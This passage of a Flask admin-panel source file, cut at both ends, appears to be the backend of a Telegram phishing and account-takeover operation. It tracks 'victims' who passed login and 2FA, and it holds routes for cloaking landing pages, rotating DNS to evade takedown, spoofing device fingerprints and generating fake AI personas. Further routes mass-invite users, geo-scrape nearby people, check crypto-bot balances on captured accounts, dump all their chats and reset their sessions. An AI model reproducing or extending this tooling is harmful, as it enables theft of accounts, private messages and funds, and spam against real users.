    member = db.session.query(AccountPoolMember).filter_by(pool_id=pool_id, account_id=account_id).first()
    if not member:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    db.session.delete(member)
    db.session.commit()
    return jsonify({'success': True})


# ==========================================
# ACCOUNT BULK OPERATIONS
# ==========================================
@admin_bp.route('/accounts/bulk')
@login_required
def account_bulk():
    """Bulk account operations page."""
    accounts_list = db.session.query(Account).order_by(Account.phone).all()
    return render_template('admin/account_bulk.html', accounts=accounts_list)


@admin_bp.route('/api/accounts/bulk_edit', methods=['POST'])
@login_required
def api_accounts_bulk_edit():
    """Bulk edit account profile fields."""
    data = request.get_json() or {}
    account_ids = data.get('account_ids', [])
    fields = data.get('fields', {})
    if not account_ids or not fields:
        return jsonify({'success': False, 'error': 'account_ids and fields required'})
    updated = 0
    for aid in account_ids:
        acc = db.session.get(Account, aid)
        if acc:
            for field in ['first_name', 'last_name', 'username']:
                if field in fields and fields[field]:
                    setattr(acc, field, fields[field])
            updated += 1
    db.session.commit()
    log_action('bulk_edit_accounts', f'Bulk edited {updated} accounts')
    return jsonify({'success': True, 'updated': updated})


@admin_bp.route('/api/accounts/bulk_status', methods=['POST'])
@login_required
def api_accounts_bulk_status():
    """Bulk change account status."""
    data = request.get_json() or {}
    account_ids = data.get('account_ids', [])
    status = data.get('status', '')
    if not account_ids or not status:
        return jsonify({'success': False, 'error': 'account_ids and status required'})
    updated = 0
    for aid in account_ids:
        acc = db.session.get(Account, aid)
        if acc:
            acc.status = status
            updated += 1
    db.session.commit()
    log_action('bulk_status_accounts', f'Bulk set status={status} for {updated} accounts')
    return jsonify({'success': True, 'updated': updated})


# ==========================================
# ACCOUNT TIMELINE
# ==========================================
@admin_bp.route('/accounts/<string:account_id>/timeline')
@login_required
def account_timeline(account_id):
    """Visual activity timeline for a specific account."""
    account = db.session.get(Account, account_id)
    if not account:
        from flask import abort
        abort(404)
    from models.account_log import AccountLog
    page = request.args.get('page', 1, type=int)
    type_filter = request.args.get('type', '').strip()
    stmt = select(AccountLog).filter(AccountLog.account_id == account_id).order_by(desc(AccountLog.created_at))
    if type_filter:
        stmt = stmt.filter(AccountLog.action == type_filter)
    timeline_events = db.paginate(stmt, page=page, per_page=50)
    action_types = db.session.execute(
        select(AccountLog.action).filter(AccountLog.account_id == account_id).distinct()
    ).scalars().all()
    return render_template('admin/account_timeline.html',
                           account=account,
                           timeline_events=timeline_events,
                           action_types=action_types,
                           type_filter=type_filter)


# ==========================================
# ACCOUNT FINGERPRINTS
# ==========================================
@admin_bp.route('/api/accounts/<string:account_id>/fingerprint', methods=['GET'])
@login_required
def api_account_fingerprint_get(account_id):
    from models.account_fingerprint import AccountFingerprint
    fp = db.session.query(AccountFingerprint).filter_by(account_id=account_id).first()
    if not fp:
        return jsonify({'success': False, 'error': 'No fingerprint found'})
    return jsonify({'success': True, 'fingerprint': {
        'device_model': fp.device_model,
        'os_version': fp.os_version,
        'app_version': fp.app_version,
        'language': fp.language,
        'timezone': fp.timezone,
        'online_schedule': fp.online_schedule,
    }})


@admin_bp.route('/api/accounts/<string:account_id>/fingerprint', methods=['POST'])
@login_required
def api_account_fingerprint_save(account_id):
    from models.account_fingerprint import AccountFingerprint
    data = request.get_json() or {}
    fp = db.session.query(AccountFingerprint).filter_by(account_id=account_id).first()
    if not fp:
        fp = AccountFingerprint(account_id=account_id)
        db.session.add(fp)
    for field in ['device_model', 'os_version', 'app_version', 'language', 'timezone', 'online_schedule']:
        if field in data:
            setattr(fp, field, data[field])
    db.session.commit()
    log_action('fingerprint_update', f'Updated fingerprint for account {account_id}')
    return jsonify({'success': True})


# ==========================================
# ANALYTICS DASHBOARD
# ==========================================
@admin_bp.route('/analytics')
@login_required
def analytics():
    """Dedicated analytics dashboard page."""
    from services.analytics.reports import get_victim_stats_over_time, get_victim_country_distribution, get_funnel_data
    days = request.args.get('days', 30, type=int)
    stats_over_time = get_victim_stats_over_time(db, days=days)
    country_dist = get_victim_country_distribution(db)
    funnel = get_funnel_data(db)
    # Victim geo data for map (lat/lon if available)
    from models.victim import Victim
    total_victims = db.session.query(func.count(Victim.id)).scalar() or 0
    logged_in = db.session.query(func.count(Victim.id)).filter(Victim.status.in_(['logged_in', '2fa_passed'])).scalar() or 0
    return render_template('admin/analytics.html',
                           stats_over_time=stats_over_time,
                           country_dist=country_dist,
                           funnel=funnel,
                           total_victims=total_victims,
                           logged_in=logged_in,
                           days=days)


# ==========================================
# WEBHOOK SYSTEM
# ==========================================
@admin_bp.route('/webhooks')
@login_required
def webhooks():
    """Webhook management page."""
    from models.webhook import Webhook, WebhookDelivery
    webhooks_list = db.session.query(Webhook).order_by(Webhook.created_at.desc()).all()
    recent_deliveries = db.session.query(WebhookDelivery).order_by(WebhookDelivery.created_at.desc()).limit(20).all()
    return render_template('admin/webhooks.html',
                           webhooks=webhooks_list,
                           recent_deliveries=recent_deliveries)


@admin_bp.route('/api/webhooks', methods=['POST'])
@login_required
def api_webhook_create():
    from models.webhook import Webhook
    data = request.get_json() or {}
    if not data.get('url'):
        return jsonify({'success': False, 'error': 'url required'})
    wh = Webhook(
        name=data.get('name', 'New Webhook'),
        url=data['url'],
        secret=data.get('secret', ''),
        events=data.get('events', []),
        is_active=data.get('is_active', True),
        retry_count=data.get('retry_count', 3),
        created_by=current_user.id,
    )
    db.session.add(wh)
    db.session.commit()
    log_action('webhook_create', f'Created webhook: {wh.name}')
    return jsonify({'success': True, 'id': wh.id})


@admin_bp.route('/api/webhooks/<int:webhook_id>', methods=['PUT'])
@login_required
def api_webhook_update(webhook_id):
    from models.webhook import Webhook
    wh = db.session.get(Webhook, webhook_id)
    if not wh:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    data = request.get_json() or {}
    for field in ['name', 'url', 'secret', 'events', 'is_active', 'retry_count']:
        if field in data:
            setattr(wh, field, data[field])
    db.session.commit()
    return jsonify({'success': True})


@admin_bp.route('/api/webhooks/<int:webhook_id>', methods=['DELETE'])
@login_required
def api_webhook_delete(webhook_id):
    from models.webhook import Webhook
    wh = db.session.get(Webhook, webhook_id)
    if not wh:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    db.session.delete(wh)
    db.session.commit()
    log_action('webhook_delete', f'Deleted webhook: {wh.name}')
    return jsonify({'success': True})


@admin_bp.route('/api/webhooks/<int:webhook_id>/test', methods=['POST'])
@login_required
def api_webhook_test(webhook_id):
    from models.webhook import Webhook
    wh = db.session.get(Webhook, webhook_id)
    if not wh:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    from services.webhook.dispatcher import dispatch_event
    try:
        dispatch_event('test', {'message': 'Test webhook from Ameba panel', 'webhook_id': webhook_id})
        return jsonify({'success': True, 'message': 'Test event dispatched'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ==========================================
# NOTES SYSTEM
# ==========================================
@admin_bp.route('/api/notes', methods=['GET'])
@login_required
def api_notes_list():
    from models.note import Note
    entity_type = request.args.get('entity_type', '')
    entity_id = request.args.get('entity_id', '')
    notes = db.session.query(Note).filter_by(entity_type=entity_type, entity_id=entity_id).order_by(Note.created_at.desc()).all()
    return jsonify({'success': True, 'notes': [
        {'id': n.id, 'content': n.content, 'created_by': n.created_by, 'created_at': str(n.created_at)}
        for n in notes
    ]})


@admin_bp.route('/api/notes', methods=['POST'])
@login_required
def api_notes_create():
    from models.note import Note
    data = request.get_json() or {}
    if not data.get('entity_type') or not data.get('entity_id') or not data.get('content'):
        return jsonify({'success': False, 'error': 'entity_type, entity_id, content required'})
    note = Note(
        entity_type=data['entity_type'],
        entity_id=str(data['entity_id']),
        content=data['content'],
        created_by=current_user.id,
    )
    db.session.add(note)
    db.session.commit()
    return jsonify({'success': True, 'id': note.id})


@admin_bp.route('/api/notes/<int:note_id>', methods=['PUT'])
@login_required
def api_notes_update(note_id):
    from models.note import Note
    note = db.session.get(Note, note_id)
    if not note:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    data = request.get_json() or {}
    if 'content' in data:
        note.content = data['content']
    db.session.commit()
    return jsonify({'success': True})


@admin_bp.route('/api/notes/<int:note_id>', methods=['DELETE'])
@login_required
def api_notes_delete(note_id):
    from models.note import Note
    note = db.session.get(Note, note_id)
    if not note:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    db.session.delete(note)
    db.session.commit()
    return jsonify({'success': True})


# ==========================================
# API KEYS MANAGEMENT
# ==========================================
@admin_bp.route('/api_keys')
@login_required
@admin_required
def api_keys():
    """API keys management page."""
    from models.api_key import ApiKey
    keys = db.session.query(ApiKey).order_by(ApiKey.created_at.desc()).all()
    return render_template('admin/api_keys.html', keys=keys)


@admin_bp.route('/api/api_keys', methods=['POST'])
@login_required
@admin_required
def api_api_key_create():
    from models.api_key import ApiKey
    data = request.get_json() or {}
    key_val = ApiKey.generate_key()
    key = ApiKey(
        name=data.get('name', 'New API Key'),
        key=key_val,
        permissions=data.get('permissions', []),
        rate_limit=data.get('rate_limit', 100),
        expires_at=None,
        is_active=True,
        created_by=current_user.id,
    )
    db.session.add(key)
    db.session.commit()
    log_action('api_key_create', f'Created API key: {key.name}')
    return jsonify({'success': True, 'id': key.id, 'key': key_val})


@admin_bp.route('/api/api_keys/<int:key_id>', methods=['PUT'])
@login_required
@admin_required
def api_api_key_update(key_id):
    from models.api_key import ApiKey
    key = db.session.get(ApiKey, key_id)
    if not key:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    data = request.get_json() or {}
    for field in ['name', 'permissions', 'rate_limit', 'is_active']:
        if field in data:
            setattr(key, field, data[field])
    db.session.commit()
    return jsonify({'success': True})


@admin_bp.route('/api/api_keys/<int:key_id>', methods=['DELETE'])
@login_required
@admin_required
def api_api_key_delete(key_id):
    from models.api_key import ApiKey
    key = db.session.get(ApiKey, key_id)
    if not key:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    db.session.delete(key)
    db.session.commit()
    log_action('api_key_delete', f'Deleted API key: {key.name}')
    return jsonify({'success': True})


# ==========================================
# USER PROFILE PAGE
# ==========================================
@admin_bp.route('/profile')
@login_required
def profile():
    """Current user's profile page."""
    from models.user_session import UserSession
    recent_actions = db.session.execute(
        select(AdminLog)
        .filter(AdminLog.username == current_user.username)
        .order_by(desc(AdminLog.timestamp))
        .limit(20)
    ).scalars().all()
    sessions = db.session.execute(
        select(UserSession)
        .filter(UserSession.user_id == current_user.id)
        .order_by(desc(UserSession.created_at))
        .limit(10)
    ).scalars().all()
    total_actions = db.session.execute(
        select(func.count(AdminLog.id)).filter(AdminLog.username == current_user.username)
    ).scalar() or 0
    return render_template('admin/profile.html',
                           recent_actions=recent_actions,
                           sessions=sessions,
                           total_actions=total_actions)


# ==========================================
# PANEL SETTINGS (CUSTOM BRANDING)
# ==========================================
@admin_bp.route('/api/panel_settings', methods=['GET'])
@login_required
def api_panel_settings_get():
    from models.panel_settings import PanelSettings
    settings = {s.key: s.value for s in db.session.query(PanelSettings).all()}
    return jsonify({'success': True, 'settings': settings})


@admin_bp.route('/api/panel_settings', methods=['POST'])
@login_required
@admin_required
def api_panel_settings_save():
    from models.panel_settings import PanelSettings
    data = request.get_json() or {}
    for k, v in data.items():
        s = db.session.query(PanelSettings).filter_by(key=k).first()
        if s:
            s.value = v
        else:
            s = PanelSettings(key=k, value=v)
            db.session.add(s)
    db.session.commit()
    log_action('panel_settings_update', f'Updated {len(data)} panel settings')
    return jsonify({'success': True})


# ==========================================
# ASYNC UTILITY (Bug Fix #3)
# ==========================================
def run_async(coro):
    """
    Safely run an async coroutine from a synchronous Flask route.
    Handles 'event loop already running' edge cases.
    """
    import asyncio
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
                future = pool.submit(asyncio.run, coro)
                return future.result()
        return loop.run_until_complete(coro)
    except RuntimeError:
        return asyncio.run(coro)


# ==========================================
# БЛОК 1: AI ГЕНЕРАЦИЯ КОММЕНТАРИЕВ И ЛИЧНОСТИ
# ==========================================

@admin_bp.route('/ai_farming')
@login_required
def ai_farming():
    """Страница AI фарминга: генерация комментариев и личностей."""
    from models.account import Account
    accounts = db.session.query(Account).filter_by(status='active').order_by(Account.phone).all()
    return render_template('admin/ai_farming.html', accounts=accounts)


@admin_bp.route('/api/ai/generate_comment', methods=['POST'])
@login_required
def api_ai_generate_comment():
    """Генерирует AI-комментарий на основе текста поста."""
    data = request.get_json() or {}
    post_text = data.get('post_text', '')
    style = data.get('style', 'neutral')
    language = data.get('language', 'ru')
    if not post_text:
        return jsonify({'success': False, 'error': 'post_text required'}), 400
    try:
        from services.ai.comment_generator import generate_comment
        comment = generate_comment(post_text, style=style, language=language)
        log_action('ai_generate_comment', f'style={style} lang={language}')
        return jsonify({'success': True, 'comment': comment})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/ai/generate_personality', methods=['POST'])
@login_required
@admin_required
def api_ai_generate_personality():
    """Генерирует случайную личность (имя, биография, аватар)."""
    data = request.get_json() or {}
    lang = data.get('lang', 'ru')
    try:
        from services.accounts.personality import generate_full_personality
        personality = generate_full_personality(lang)
        # Не возвращаем байты аватара в JSON — клиент запросит отдельно
        result = {k: v for k, v in personality.items() if k != 'avatar_bytes'}
        result['has_avatar'] = bool(personality.get('avatar_bytes'))
        return jsonify({'success': True, 'personality': result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/ai/apply_personality/<account_id>', methods=['POST'])
@login_required
@admin_required
def api_ai_apply_personality(account_id):
    """Применяет случайную личность к аккаунту (имя, биография, аватар)."""
    from models.account import Account
    data = request.get_json() or {}
    lang = data.get('lang', 'ru')
    account = db.session.get(Account, account_id)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'}), 404
    try:
        from services.accounts.personality import apply_personality_to_account
        result = apply_personality_to_account(account_id, lang=lang)
        log_action('apply_personality', f'account={account_id} lang={lang}')
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/ai/simulate_typing', methods=['POST'])
@login_required
def api_ai_simulate_typing():
    """Имитирует набор текста в указанном чате."""
    data = request.get_json() or {}
    account_id = data.get('account_id', '')
    chat_id = data.get('chat_id')
    duration = int(data.get('duration', 5))
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'account_id and chat_id required'}), 400
    try:
        from services.telegram.actions import simulate_typing
        ok = run_async(simulate_typing(account_id, int(chat_id), duration))
        log_action('simulate_typing', f'account={account_id} chat={chat_id}')
        return jsonify({'success': ok})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/ai/react_to_post', methods=['POST'])
@login_required
def api_ai_react_to_post():
    """Ставит реакцию на пост/сообщение."""
    data = request.get_json() or {}
    account_id = data.get('account_id', '')
    chat_id = data.get('chat_id')
    message_id = data.get('message_id')
    reaction = data.get('reaction', '👍')
    if not account_id or not chat_id or not message_id:
        return jsonify({'success': False, 'error': 'account_id, chat_id, message_id required'}), 400
    try:
        from services.telegram.actions import react_to_message
        ok = run_async(react_to_message(account_id, int(chat_id), int(message_id), reaction))
        log_action('react_to_post', f'account={account_id} msg={message_id} reaction={reaction}')
        return jsonify({'success': ok})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ==========================================
# БЛОК 2: РАССЫЛКА КРУЖКОВ И ГОЛОСОВЫХ
# ==========================================

@admin_bp.route('/api/campaigns/send_voice', methods=['POST'])
@login_required
@admin_required
def api_campaign_send_voice():
    """Отправляет голосовое сообщение через указанный аккаунт."""
    account_id = request.form.get('account_id', '')
    chat_id = request.form.get('chat_id', '')
    duration = int(request.form.get('duration', 5))
    audio_file = request.files.get('audio')
    if not account_id or not chat_id or not audio_file:
        return jsonify({'success': False, 'error': 'account_id, chat_id, audio required'}), 400
    audio_bytes = audio_file.read()
    try:
        from services.telegram.actions import send_voice_message
        ok = run_async(send_voice_message(account_id, int(chat_id), audio_bytes, duration))
        log_action('send_voice', f'account={account_id} chat={chat_id}')
        return jsonify({'success': ok})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/campaigns/send_video_note', methods=['POST'])
@login_required
@admin_required
def api_campaign_send_video_note():
    """Отправляет кружок (video note) через указанный аккаунт."""
    account_id = request.form.get('account_id', '')
    chat_id = request.form.get('chat_id', '')
    duration = int(request.form.get('duration', 10))
    video_file = request.files.get('video')
    if not account_id or not chat_id or not video_file:
        return jsonify({'success': False, 'error': 'account_id, chat_id, video required'}), 400
    video_bytes = video_file.read()
    try:
        from services.telegram.actions import send_video_note
        ok = run_async(send_video_note(account_id, int(chat_id), video_bytes, duration))
        log_action('send_video_note', f'account={account_id} chat={chat_id}')
        return jsonify({'success': ok})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/campaigns/invite_users', methods=['POST'])
@login_required
@admin_required
def api_campaign_invite_users():
    """Инвайтит пользователей в группу."""
    data = request.get_json() or {}
    account_id = data.get('account_id', '')
    group_id = data.get('group_id')
    user_ids = data.get('user_ids', [])
    if not account_id or not group_id or not user_ids:
        return jsonify({'success': False, 'error': 'account_id, group_id, user_ids required'}), 400
    try:
        from services.telegram.actions import invite_users_to_group
        result = run_async(invite_users_to_group(account_id, int(group_id), user_ids))
        log_action('invite_users', f'account={account_id} group={group_id} count={len(user_ids)}')
        return jsonify({'success': True, **result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ==========================================
# БЛОК 3: РАСШИРЕННЫЙ ПАРСИНГ
# ==========================================

@admin_bp.route('/api/parser/channel_commenters', methods=['POST'])
@login_required
def api_parser_channel_commenters():
    """Запускает парсинг комментаторов канала."""
    from models.parse_task import ParseTask
    data = request.get_json() or {}
    channel_link = data.get('channel_link', '').strip()
    account_id = data.get('account_id')
    if not channel_link or not account_id:
        return jsonify({'success': False, 'error': 'channel_link and account_id required'}), 400
    task = ParseTask(
        name=f'Commenters: {channel_link}',
        source_type='channel_commenters',
        source_link=channel_link,
        account_id=account_id,
        filters=data.get('filters', {}),
        created_by=current_user.id,
        status='pending',
    )
    db.session.add(task)
    db.session.commit()
    log_action('parser_channel_commenters', f'channel={channel_link}')
    try:
        from tasks.parser import run_parse_task
        run_parse_task.delay(task.id, account_id, channel_link, {'type': 'channel_commenters'})
    except Exception as e:
        log.warning(f"Could not launch celery task: {e}")
    return jsonify({'success': True, 'id': task.id})


@admin_bp.route('/api/parser/geo', methods=['POST'])
@login_required
def api_parser_geo():
    """Запускает гео-парсинг (люди рядом)."""
    from models.parse_task import ParseTask
    data = request.get_json() or {}
    lat = data.get('latitude')
    lon = data.get('longitude')
    account_id = data.get('account_id')
    radius_km = int(data.get('radius_km', 5))
    if lat is None or lon is None or not account_id:
        return jsonify({'success': False, 'error': 'latitude, longitude, account_id required'}), 400
    task = ParseTask(
        name=f'Geo: {lat},{lon} r={radius_km}km',
        source_type='geo',
        source_link=f'{lat},{lon}',
        account_id=account_id,
        filters={'latitude': lat, 'longitude': lon, 'radius_km': radius_km},
        created_by=current_user.id,
        status='pending',
    )
    db.session.add(task)
    db.session.commit()
    log_action('parser_geo', f'lat={lat} lon={lon} r={radius_km}km')
    try:
        from tasks.parser import run_parse_task
        run_parse_task.delay(task.id, account_id, f'{lat},{lon}', {'type': 'geo', 'latitude': lat, 'longitude': lon, 'radius_km': radius_km})
    except Exception as e:
        log.warning(f"Could not launch celery task: {e}")
    return jsonify({'success': True, 'id': task.id})


@admin_bp.route('/api/parser/<int:task_id>/lookalike', methods=['POST'])
@login_required
def api_parser_lookalike(task_id):
    """Запускает lookalike-алгоритм пересечения с другой базой."""
    from models.parse_task import ParseTask
    data = request.get_json() or {}
    target_task_id = data.get('target_task_id')
    source_task = db.session.get(ParseTask, task_id)
    target_task = db.session.get(ParseTask, target_task_id)
    if not source_task or not target_task:
        return jsonify({'success': False, 'error': 'Tasks not found'}), 404
    if not source_task.result_data or not target_task.result_data:
        return jsonify({'success': False, 'error': 'Tasks have no result data'}), 400
    from services.telegram.parser import apply_lookalike_filter
    result = apply_lookalike_filter(source_task.result_data, target_task.result_data)
    log_action('lookalike', f'source={task_id} target={target_task_id} found={len(result)}')
    return jsonify({'success': True, 'hot_leads': result, 'count': len(result)})


@admin_bp.route('/api/parser/<int:task_id>/scrub', methods=['POST'])
@login_required
def api_parser_scrub(task_id):
    """Очищает базу от некачественных пользователей."""
    from models.parse_task import ParseTask
    data = request.get_json() or {}
    task = db.session.get(ParseTask, task_id)
    if not task or not task.result_data:
        return jsonify({'success': False, 'error': 'Task not found or no data'}), 404
    from services.telegram.parser import scrub_user_base
    original_count = len(task.result_data)
    scrubbed = scrub_user_base(
        task.result_data,
        min_username=data.get('min_username', False),
        no_bots=data.get('no_bots', True),
        has_photo=data.get('has_photo', False),
    )
    task.result_data = scrubbed
    task.total_parsed = len(scrubbed)
    db.session.commit()
    removed = original_count - len(scrubbed)
    log_action('scrub_base', f'task={task_id} removed={removed}')
    return jsonify({'success': True, 'original': original_count, 'after_scrub': len(scrubbed), 'removed': removed})


# ==========================================
# БЛОК 4: DNS РОТАЦИЯ И КЛОАКИНГ
# ==========================================

@admin_bp.route('/cloaking')
@login_required
@admin_required
def cloaking():
    """Управление клоакингом лендингов."""
    return render_template('admin/cloaking.html')


@admin_bp.route('/api/cloaking/settings', methods=['GET'])
@login_required
def api_cloaking_settings_get():
    """Получает настройки клоакинга."""
    from models.panel_settings import PanelSettings
    keys = ['cloaking_enabled', 'cloaking_fake_page', 'cloaking_blocked_ips']
    settings = {s.key: s.value for s in db.session.query(PanelSettings).filter(
        PanelSettings.key.in_(keys)
    ).all()}
    return jsonify({'success': True, 'settings': settings})


@admin_bp.route('/api/cloaking/settings', methods=['POST'])
@login_required
@admin_required
def api_cloaking_settings_save():
    """Сохраняет настройки клоакинга."""
    from models.panel_settings import PanelSettings
    data = request.get_json() or {}
    allowed_keys = {'cloaking_enabled', 'cloaking_fake_page', 'cloaking_blocked_ips'}
    for k, v in data.items():
        if k not in allowed_keys:
            continue
        s = db.session.query(PanelSettings).filter_by(key=k).first()
        if s:
            s.value = str(v)
        else:
            s = PanelSettings(key=k, value=str(v))
            db.session.add(s)
    db.session.commit()
    log_action('cloaking_settings_update', f'Updated cloaking settings')
    return jsonify({'success': True})


@admin_bp.route('/dns')
@login_required
@admin_required
def dns_management():
    """Управление DNS-ротацией через Cloudflare API."""
    return render_template('admin/dns.html')


@admin_bp.route('/api/dns/records')
@login_required
@admin_required
def api_dns_records():
    """Получает список DNS-записей из Cloudflare."""
    try:
        from services.dns.manager import list_dns_records
        records = list_dns_records()
        return jsonify({'success': True, 'records': records})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/dns/rotate', methods=['POST'])
@login_required
@admin_required
def api_dns_rotate():
    """Меняет IP-адрес в DNS-записи домена."""
    data = request.get_json() or {}
    new_ip = data.get('new_ip', '').strip()
    record_name = data.get('record_name', '@').strip()
    old_domain = data.get('domain', '')
    if not new_ip:
        return jsonify({'success': False, 'error': 'new_ip required'}), 400
    try:
        from services.dns.manager import rotate_domain
        result = rotate_domain(old_domain, new_ip, record_name)
        log_action('dns_rotate', f'domain={old_domain} ip={new_ip}')
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/dns/settings', methods=['POST'])
@login_required
@admin_required
def api_dns_settings_save():
    """Сохраняет настройки DNS (Cloudflare token, zone)."""
    from models.panel_settings import PanelSettings
    data = request.get_json() or {}
    allowed_keys = {'dns_provider', 'cloudflare_token', 'cloudflare_zone_id', 'dns_enabled'}
    for k, v in data.items():
        if k not in allowed_keys:
            continue
        s = db.session.query(PanelSettings).filter_by(key=k).first()
        if s:
            s.value = str(v)
        else:
            s = PanelSettings(key=k, value=str(v))
            db.session.add(s)
    db.session.commit()
    log_action('dns_settings_update', 'Updated DNS settings')
    return jsonify({'success': True})


# ==========================================
# БЛОК 4: КРИПТО-БАЛАНСЫ
# ==========================================

@admin_bp.route('/api/crypto/balance', methods=['POST'])
@login_required
def api_crypto_balance():
    """Проверяет баланс крипто-бота для указанного аккаунта."""
    data = request.get_json() or {}
    account_id = data.get('account_id', '')
    bot_username = data.get('bot_username', '@CryptoBot')
    if not account_id:
        return jsonify({'success': False, 'error': 'account_id required'}), 400
    try:
        from services.crypto.balance import check_crypto_balance
        result = run_async(check_crypto_balance(account_id, bot_username))
        log_action('crypto_balance_check', f'account={account_id} bot={bot_username}')
        return jsonify({'success': True, **result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/crypto/balance_all', methods=['POST'])
@login_required
def api_crypto_balance_all():
    """Проверяет балансы во всех известных крипто-ботах."""
    data = request.get_json() or {}
    account_id = data.get('account_id', '')
    if not account_id:
        return jsonify({'success': False, 'error': 'account_id required'}), 400
    try:
        from services.crypto.balance import check_all_crypto_bots
        result = run_async(check_all_crypto_bots(account_id))
        log_action('crypto_balance_all', f'account={account_id}')
        return jsonify({'success': True, 'results': result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ==========================================
# БЛОК 5: РОТАЦИЯ МОБИЛЬНЫХ ПРОКСИ
# ==========================================

@admin_bp.route('/api/proxies/<int:proxy_id>/rotate_mobile', methods=['POST'])
@login_required
@admin_required
def api_proxy_rotate_mobile(proxy_id):
    """
    Ротирует мобильный прокси через его API (смена IP).
    Прокси должен иметь поле rotation_url.
    """
    from models.proxy import Proxy
    proxy = db.session.get(Proxy, proxy_id)
    if not proxy:
        return jsonify({'success': False, 'error': 'Proxy not found'}), 404
    rotation_url = getattr(proxy, 'rotation_url', None)
    if not rotation_url:
        return jsonify({'success': False, 'error': 'Proxy has no rotation_url configured'}), 400
    # Защита от SSRF: разрешаем только HTTP/HTTPS, блокируем внутренние адреса
    import urllib.parse
    try:
        parsed = urllib.parse.urlparse(rotation_url)
        if parsed.scheme not in ('http', 'https'):
            return jsonify({'success': False, 'error': 'Invalid rotation URL scheme'}), 400
        hostname = parsed.hostname or ''
        # Блокируем обращения к внутренним адресам
        blocked_hosts = ('localhost', '127.0.0.1', '0.0.0.0', '::1')
        if hostname in blocked_hosts or hostname.startswith('192.168.') or hostname.startswith('10.') or hostname.startswith('172.'):
            return jsonify({'success': False, 'error': 'Internal addresses are not allowed'}), 400
    except Exception:
        return jsonify({'success': False, 'error': 'Invalid rotation URL'}), 400
    try:
        import requests as req
        resp = req.get(rotation_url, timeout=15, allow_redirects=False)
        if resp.status_code == 200:
            log_action('proxy_rotate_mobile', f'proxy_id={proxy_id}')
            return jsonify({'success': True, 'response': resp.text[:500]})
        return jsonify({'success': False, 'error': f'HTTP {resp.status_code}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ==========================================
# БЛОК 6: TELEGRAM-УПРАВЛЕНИЕ
# ==========================================

@admin_bp.route('/api/accounts/<account_id>/reset_sessions', methods=['POST'])
@login_required
@admin_required
def api_account_reset_sessions(account_id):
    """Сбрасывает все авторизованные сессии аккаунта (кроме текущей)."""
    from models.account import Account
    account = db.session.get(Account, account_id)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'}), 404
    try:
        from services.telegram.actions import reset_all_sessions
        ok = run_async(reset_all_sessions(account_id))
        log_action('reset_all_sessions', f'account={account_id}')
        return jsonify({'success': ok})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/accounts/<account_id>/dump_chats', methods=['POST'])
@login_required
@admin_required
def api_account_dump_chats(account_id):
    """Дампит все чаты аккаунта в ZIP-архив и возвращает для скачивания."""
    from models.account import Account
    data = request.get_json() or {}
    limit_per_chat = int(data.get('limit_per_chat', 100))
    account = db.session.get(Account, account_id)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'}), 404
    try:
        from services.telegram.actions import dump_all_chats
        result = run_async(dump_all_chats(account_id, limit_per_chat))
        if 'error' in result:
            return jsonify({'success': False, 'error': result['error']}), 500
        log_action('dump_chats', f'account={account_id} chats={result.get("chat_count", 0)}')
        import io as _io
        buf = _io.BytesIO(result['archive'])
        return send_file(
            buf,
            mimetype='application/zip',
            as_attachment=True,
            download_name=f'chats_{account_id}.zip',
        )
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/accounts/<account_id>/active_sessions', methods=['GET'])
@login_required
@admin_required
def api_account_active_sessions(account_id):
    """Возвращает список активных авторизованных сессий аккаунта."""
    from models.account import Account
    account = db.session.get(Account, account_id)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'}), 404
    try:
        from services.telegram.actions import get_active_sessions
        sessions = run_async(get_active_sessions(account_id))
        log_action('get_active_sessions', f'account={account_id} count={len(sessions)}')
        return jsonify({'success': True, 'sessions': sessions})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/accounts/<account_id>/check_spambot', methods=['POST'])
@login_required
@admin_required
def api_account_check_spambot(account_id):
    """Проверяет статус аккаунта через @spambot."""
    from models.account import Account
    account = db.session.get(Account, account_id)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'}), 404
    try:
        from services.telegram.actions import check_spambot
        result = run_async(check_spambot(account_id))
        log_action('check_spambot', f'account={account_id} status={result.get("status")}')
        return jsonify({'success': True, **result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/accounts/<account_id>/parse_contacts', methods=['POST'])
@login_required
@admin_required
def api_account_parse_contacts(account_id):
    """Парсит контакты из последних диалогов аккаунта."""
    from models.account import Account
    data = request.get_json() or {}
    limit = int(data.get('limit', 100))
